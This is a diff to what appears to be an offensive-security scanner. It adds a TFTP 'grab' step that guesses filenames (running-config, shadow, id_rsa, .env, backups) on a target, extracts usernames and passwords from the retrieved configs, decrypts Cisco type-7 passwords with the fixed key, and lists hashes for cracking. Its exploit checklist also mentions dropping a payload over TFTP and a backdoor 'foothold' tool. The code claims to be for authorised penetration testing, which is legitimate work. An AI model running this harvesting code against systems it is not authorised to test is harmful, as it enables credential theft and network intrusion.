@@ -2279,6 +2279,24 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
         return {"state": "EXPOSED", "cve": cve, "risk": "HIGH" if ni else "MEDIUM",
                 "summary": summ[:140]}
 
+    # 2bb) tftp-grab: creds/secrets pulled from world-readable device configs & boot files
+    if sid == "tftp-grab":
+        creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
+        secrets = re.findall(r"^✗ SECRET (.+)$", output, re.M)
+        files = re.findall(r"^· FILE ", output, re.M)
+        if creds:
+            shown = "; ".join(c.strip() for c in creds[:3]) + (f" +{len(creds) - 3}" if len(creds) > 3 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"TFTP config creds: {shown}"[:140]}
+        if secrets:
+            shown = "; ".join(s.strip() for s in secrets[:2]) + (f" +{len(secrets) - 2}" if len(secrets) > 2 else "")
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": f"TFTP config secrets: {shown}"[:140]}
+        if files:
+            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
+                    "summary": f"TFTP: {len(files)} world-readable file(s) retrieved"[:140]}
+        return None
+
     # 2ba) tftp-probe: path-traversal arbitrary read (critical) → else just a reachable TFTP server
     if sid == "tftp-probe":
         reads = re.findall(r"^✗ VULN arbitrary file read via path traversal — (.+?) readable$", output, re.M)
@@ -3129,9 +3147,8 @@ _EXPLOIT_STEPS = {
     ],
     "tftp": [
         ("Confirm UDP/69 (no auth) + path-traversal read", "tftp-probe"),
-        "GET well-known files: running-config / startup-config, backups, app configs",
+        ("Sweep known filenames (configs/boot/backups) → grep creds & secrets", "tftp-grab"),
         "Test PUT (arbitrary write) → overwrite a config or drop a payload",
-        "Fuzz filenames from a wordlist — device configs often leak credentials",
     ],
     "nfs": [
         "List exports & allowed clients (showmount -e; nmap nfs-*)",
@@ -11400,6 +11417,131 @@ def _tool_tftp_probe(ip: str, port: int, proto: str) -> str:
     return f"TFTP probe — {ip}:{port}/udp\n\n" + "\n".join(lines)
 
 
+# ── TFTP step 2: grab well-known files (no listing → guess names) → grep for creds ─
+# TFTP can't list a directory, so enumeration IS filename guessing. This set targets what
+# actually lands on a TFTP server in the wild: network-device configs (the richest — they
+# leak enable/user creds & SNMP), boot/PXE files, and stray backups/web configs.
+_TFTP_WORDLIST = [
+    # network device configs — the jackpot (Cisco/Juniper/HP/etc.)
+    "running-config", "startup-config", "running.cfg", "startup.cfg", "config.text",
+    "config.cfg", "config.txt", "config.xml", "nvram", "router-config", "router.cfg",
+    "switch-config", "switch.cfg", "backup-config", "backup.cfg", "cisco.cfg", "confg",
+    # VoIP phone provisioning
+    "SEPDefault.cnf", "SIPDefault.cnf", "XMLDefault.cnf.xml", "0000000000000.cnf.xml",
+    "gk.cfg", "g3.cfg",
+    # PXE / boot
+    "pxelinux.cfg/default", "pxelinux.0", "boot.ini", "grub.cfg",
+    # backups / archives operators drop here
+    "backup.tar", "backup.zip", "backup.tgz", "config.bak", "flash.bin",
+    # windows / app configs & the odd secret file
+    "web.config", "unattend.xml", "sysprep.xml", ".env", "passwd", "shadow", "id_rsa",
+]
+_TFTPGRAB_DEADLINE = 90          # s — wall-clock cap on the whole sweep
+_TFTPGRAB_MAXBYTES = 262144      # per file (256 KiB) — configs are small; don't slurp firmware
+
+# Cisco type-7 is trivially reversible (fixed-key Vigenère) → decrypt to a usable cred.
+_C7_KEY = "dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"
+
+
+def _cisco_type7(h: str) -> "str | None":
+    """Decrypt a Cisco type-7 (password 7 <hex>) string. Returns cleartext or None."""
+    try:
+        h = h.strip()
+        salt, enc = int(h[:2]), h[2:]
+        if len(enc) % 2:
+            return None
+        out = []
+        for i in range(0, len(enc), 2):
+            b = int(enc[i:i + 2], 16)
+            out.append(chr(b ^ ord(_C7_KEY[(salt + i // 2) % len(_C7_KEY)])))
+        return "".join(out)
+    except Exception:                                        # noqa: BLE001
+        return None
+
+
+def _tftp_config_creds(text: str) -> tuple:
+    """Mine a network-device config for creds. Returns (creds, secrets):
+    creds = [(user, pw, src)] recovered cleartext (incl. decrypted type-7);
+    secrets = [desc] for non-reversible hashes / community strings to note & crack."""
+    creds, secrets = [], []
+    # username <u> [privilege N] password|secret [<type>] <val> — type decides cleartext vs hash
+    for m in re.finditer(r"(?im)^\s*username\s+(\S+)\s+.*?\b(password|secret)\s+(?:([0-9])\s+)?(\S+)", text):
+        user, kind, typ, val = m.group(1), m.group(2), m.group(3), m.group(4)
+        if typ == "7":
+            dec = _cisco_type7(val)
+            if dec:
+                creds.append((user, dec, "type-7"))
+        elif typ in ("5", "8", "9"):
+            secrets.append(f"user '{user}' {kind} hash {val[:24]}… (crack: hashcat)")
+        else:                                                # no type or type 0 → cleartext
+            creds.append((user, val, "cleartext"))
+    # enable password|secret [<type>] <val>
+    for m in re.finditer(r"(?im)^\s*enable\s+(password|secret)\s+(?:([0-9])\s+)?(\S+)", text):
+        kind, typ, val = m.group(1), m.group(2), m.group(3)
+        if typ == "7":
+            dec = _cisco_type7(val)
+            creds.append(("enable", dec or val, "type-7" if dec else "cleartext"))
+        elif typ in ("5", "8", "9"):
+            secrets.append(f"enable {kind} hash {val[:24]}… (crack: hashcat)")
+        else:
+            creds.append(("enable", val, "cleartext"))
+    # bare line/console password 7 <hex> (vty/con) — not a username/enable line
+    for ln in text.splitlines():
+        s = ln.strip()
+        if s.startswith(("username", "enable")):
+            continue
+        mm = re.search(r"\bpassword\s+7\s+([0-9A-Fa-f]{4,})\b", s)
+        if mm:
+            dec = _cisco_type7(mm.group(1))
+            if dec:
+                creds.append(("(line)", dec, "type-7"))
+    for m in re.finditer(r"(?im)^\s*snmp-server\s+community\s+(\S+)\s*(RO|RW)?", text):
+        secrets.append(f"SNMP community '{m.group(1)}'{(' ' + m.group(2)) if m.group(2) else ''}")
+    return creds, secrets
+
+
+def _tool_tftp_grab(ip: str, port: int, proto: str) -> str:
+    """TFTP step 2 tool: since TFTP can't list a directory, sweep a wordlist of well-known
+    filenames (device configs, VoIP/PXE/boot, backups, web configs) via RRQ, grep every retrieved
+    file IN MEMORY for creds (Cisco type-7 decrypted, cleartext user/enable) and secrets (type-5/9
+    hashes, SNMP communities, API keys via the shared _SECRET_PATTERNS). Nothing is written to
+    disk. Read-only. A host that hands back nothing raises. Authorised targets only."""
+    import time
+    deadline = time.time() + _TFTPGRAB_DEADLINE
+    got, creds, secrets = [], [], []
+    for name in _TFTP_WORDLIST:
+        if time.time() > deadline:
+            break
+        st, payload = _tftp_read(ip, port, name, timeout=3.0, max_bytes=_TFTPGRAB_MAXBYTES)
+        if st != "data" or not payload:
+            continue
+        got.append((name, len(payload)))
+        text = payload.decode("latin-1", "replace")
+        c, s = _tftp_config_creds(text)
+        for user, pw, src in c:
+            creds.append((user, pw, f"{name} {src}"))
+        secrets += [f"{d}  ({name})" for d in s]
+        for label, snip in _smb_grep_secrets(text):
+            secrets.append(f"{label}: {snip}  ({name})")
+
+    if not got:
+        raise RuntimeError(f"{ip}:{port}/udp — no known filename retrieved "
+                           f"({len(_TFTP_WORDLIST)} tried); guess device-specific names / <hostname>-config")
+
+    creds = list(dict.fromkeys(creds))
+    secrets = list(dict.fromkeys(secrets))
+    lines = []
+    for user, pw, src in creds:
+        lines.append(f"✗ CRED {user}:{pw} ({src})")
+    for desc in secrets:
+        lines.append(f"✗ SECRET {desc}")
+    for name, size in got:
+        lines.append(f"· FILE {name} ({size} b)")
+    lines.append(f"\n[*] {len(got)}/{len(_TFTP_WORDLIST)} filenames retrieved · "
+                 f"{len(creds)} cred(s) · {len(secrets)} secret(s) — grepped in memory, nothing saved to disk")
+    return f"TFTP grab — {ip}:{port}/udp\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -11458,6 +11600,7 @@ _STEP_TOOLS = {
     "ftp-foothold": ("foothold → backdoor / web-RCE / ssh-key (interactive, pick)", _tool_ftp_foothold),
     "ftp-next": ("manual FTP steps (context-aware, reference only)", _tool_ftp_next),
     "tftp-probe": ("confirm UDP/69 + path-traversal read (raw UDP, content-verified)", _tool_tftp_probe),
+    "tftp-grab": ("sweep known filenames → configs/creds/secrets (raw UDP, in-memory grep)", _tool_tftp_grab),
 }
 
 def _mins(seconds: int) -> str:
@@ -11531,6 +11674,7 @@ _STEP_TOOL_RUNS = {
     "ftp-foothold":     ("Python + nc/ssh", None),
     "ftp-next":         ("reference · no scan", None),
     "tftp-probe":       ("Python (raw UDP)", None),
+    "tftp-grab":        ("Python (raw UDP)", f"{_mins(_TFTPGRAB_DEADLINE)} min"),
 }
 
 
